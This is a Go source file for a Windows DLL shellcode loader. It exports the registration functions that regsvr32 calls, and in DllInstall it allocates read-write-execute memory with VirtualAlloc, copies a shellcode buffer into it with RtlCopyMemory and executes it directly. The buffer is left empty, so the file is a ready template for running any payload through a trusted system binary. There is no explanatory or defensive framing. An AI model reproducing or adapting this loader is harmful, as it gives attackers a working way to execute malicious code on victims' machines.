package main

import (
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

//export EntryPoint
func EntryPoint() {
}

//export DllRegisterServer
func DllRegisterServer() {
}

//export DllUnregisterServer
func DllUnregisterServer() {
}

//export DllInstall
func DllInstall() {
	sc := []byte{}
	ShellCodeRTLCopyMemory(sc)
}

func ShellCodeRTLCopyMemory(shellcode []byte) error {

	// allocate memory within the current process
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return err
	}

	// copy shellcode into memory
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			return err
		}
	}

	// execute shellcode
	_, _, err = syscall.Syscall(addr, 0, 0, 0, 0)
	if err != nil {
		if err.Error() != "The operation completed successfully." {
			return err
		}
	}
	return nil
}

func main() {
}
